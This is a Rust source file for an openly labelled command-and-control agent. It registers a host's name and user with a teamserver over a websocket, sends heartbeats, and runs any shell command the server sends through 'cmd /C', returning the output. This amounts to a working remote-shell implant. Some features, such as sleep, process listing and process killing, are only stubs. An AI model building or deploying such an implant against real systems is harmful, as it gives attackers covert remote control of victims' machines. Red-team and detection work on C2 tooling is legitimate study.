use anyhow::Result;
use clap::Parser;
use rust_c2::{types::*, crypto::*, protocol::*, utils::*};
use tokio::time::{sleep, Duration};
use uuid::Uuid;
use chrono::Utc;
use std::env;

#[derive(Parser)]
#[command(name = "agent")]
#[command(about = "Rust C2 Agent - Command and Control Agent")]
struct Cli {
    #[arg(short, long, default_value = "ws://127.0.0.1:8080")]
    server: String,
    
    #[arg(short, long, default_value = "default-key-change-in-production")]
    key: String,
    
    #[arg(short, long, default_value = "30")]
    heartbeat: u64,
}

#[tokio::main]
async fn main() -> Result<()> {
    let cli = Cli::parse();
    
    // Initialize logging
    log_info("agent", "Starting C2 agent");
    
    let config = AgentConfig {
        server_url: cli.server.clone(),
        encryption_key: cli.key.clone(),
        heartbeat_interval: cli.heartbeat,
        retry_interval: 5,
        max_retries: 3,
        user_agent: "Rust-C2-Agent/1.0".to_string(),
        proxy: None,
    };
    
    log_info("agent", &format!("Configuration: server={}, key={}, heartbeat={}", cli.server, cli.key, cli.heartbeat));
    
    let mut agent = C2Agent::new(config)?;
    log_success("agent", "Agent initialized successfully");
    agent.start().await?;
    Ok(())
}

struct C2Agent {
    config: AgentConfig,
    encryption_key: EncryptionKey,
    agent_id: Option<AgentId>,
}

impl C2Agent {
    fn new(config: AgentConfig) -> Result<Self> {
        let encryption_key = EncryptionKey::new(&config.encryption_key)?;
        Ok(Self {
            config,
            encryption_key,
            agent_id: None,
        })
    }
    
    async fn start(&mut self) -> Result<()> {
        log_info("agent", "Starting C2 agent...");
        log_info("agent", &format!("Server: {}", self.config.server_url));
        println!("Starting C2 agent...");
        println!("Server: {}", self.config.server_url);
        
        loop {
            match self.connect_and_run().await {
                Ok(_) => {
                    log_warning("agent", &format!("Connection closed, retrying in {} seconds...", self.config.retry_interval));
                    println!("Connection closed, retrying in {} seconds...", self.config.retry_interval);
                    sleep(Duration::from_secs(self.config.retry_interval)).await;
                }
                Err(e) => {
                    log_error("agent", &format!("Connection error: {}", e));
                    eprintln!("Connection error: {}", e);
                    println!("Retrying in {} seconds...", self.config.retry_interval);
                    sleep(Duration::from_secs(self.config.retry_interval)).await;
                }
            }
        }
    }
    
    async fn connect_and_run(&mut self) -> Result<()> {
        let mut connection = AgentConnection::connect(&self.config.server_url, self.encryption_key.clone()).await?;
        
        // Get system information
        let agent_info = self.get_system_info();
        // Register with the server
        connection.register(agent_info.clone()).await?;
        // Set agent_id in the connection for heartbeat
        connection.set_agent_id(agent_info.id);
        // Store agent_id in self for heartbeat logic
        self.agent_id = Some(agent_info.id);
        println!("✅ Registered with teamserver");
        
        // Start heartbeat loop
        let heartbeat_interval = Duration::from_secs(self.config.heartbeat_interval);
        
        loop {
            tokio::select! {
                // Send heartbeat
                _ = sleep(heartbeat_interval) => {
                    if let Some(_agent_id) = self.agent_id {
                        if let Err(e) = connection.send_heartbeat().await {
                            eprintln!("Failed to send heartbeat: {}", e);
                            return Err(e);
                        }
                    }
                }
                // Receive commands
                result = connection.receive_message() => {
                    match result {
                        Ok(Some(message)) => {
                            match message {
                                Message::Command { command_id, command } => {
                                    println!("📨 Received command: {:?}", command);
                                    let response = self.execute_command(command).await?;
                                    connection.send_response(command_id, response).await?;
                                }
                                _ => {
                                    println!("📨 Received message: {:?}", message);
                                }
                            }
                        }
                        Ok(None) => {
                            println!("Connection closed by server");
                            return Ok(());
                        }
                        Err(e) => {
                            eprintln!("Error receiving message: {}", e);
                            return Err(e);
                        }
                    }
                }
            }
        }
    }
    
    fn get_system_info(&self) -> AgentInfo {
        let hostname = hostname::get()
            .unwrap_or_default()
            .to_string_lossy()
            .to_string();
        
        let username = env::var("USERNAME").unwrap_or_else(|_| "unknown".to_string());
        let os_info = format!("Windows {}", env::consts::OS);
        
        AgentInfo {
            id: Uuid::new_v4(),
            hostname,
            username,
            os: os_info,
            ip_address: "127.0.0.1".to_string(),
            mac_address: "00:00:00:00:00:00".to_string(),
            first_seen: Utc::now(),
            last_seen: Utc::now(),
            status: AgentStatus::Online,
            version: "0.1.0".to_string(),
        }
    }
    
    async fn execute_command(&self, command: CommandType) -> Result<CommandResponse> {
        match command {
            CommandType::ShellCommand(cmd) => {
                println!("Executing shell command: {}", cmd);
                let output = std::process::Command::new("cmd")
                    .args(&["/C", &cmd])
                    .output()?;
                
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);
                let combined_output = format!("STDOUT:\n{}\nSTDERR:\n{}", stdout, stderr);
                
                Ok(CommandResponse::Success {
                    output: combined_output,
                    exit_code: output.status.code().unwrap_or(0),
                })
            }
            CommandType::GetSystemInfo => {
                println!("Getting system info");
                let agent_info = self.get_system_info();
                let system_info = SystemInfo {
                    hostname: agent_info.hostname,
                    os: agent_info.os,
                    architecture: env::consts::ARCH.to_string(),
                    username: agent_info.username,
                    uptime: 0, // Would need to implement proper uptime calculation
                    memory_total: 0, // Would need to implement memory info
                    memory_used: 0,
                    cpu_count: num_cpus::get(),
                    ip_addresses: vec![agent_info.ip_address],
                    mac_addresses: vec![agent_info.mac_address],
                };
                Ok(CommandResponse::SystemInfo(system_info))
            }
            CommandType::Kill => {
                println!("Received kill command, terminating...");
                std::process::exit(0);
            }
            CommandType::Sleep { duration, jitter_percent } => {
                println!("Received sleep command: {}ms with {}% jitter", duration, jitter_percent);
                // For now, just acknowledge the sleep command
                // In a real implementation, the agent would actually sleep
                Ok(CommandResponse::Success {
                    output: format!("Sleep command received: {}ms with {}% jitter", duration, jitter_percent),
                    exit_code: 0,
                })
            }
            CommandType::GetProcessList => {
                println!("Getting process list");
                // For now, return a simple process list
                // In a real implementation, you'd use sysinfo or similar
                let processes = vec![
                    ProcessInfo {
                        pid: 1,
                        name: "System".to_string(),
                        command: "System".to_string(),
                        memory_usage: 0,
                        cpu_usage: 0.0,
                    }
                ];
                Ok(CommandResponse::ProcessList(processes))
            }
            CommandType::KillProcess(pid) => {
                println!("Killing process with PID: {}", pid);
                // For now, just acknowledge the command
                // In a real implementation, you'd actually kill the process
                Ok(CommandResponse::Success {
                    output: format!("Kill command received for PID: {}", pid),
                    exit_code: 0,
                })
            }
        }
    }
} 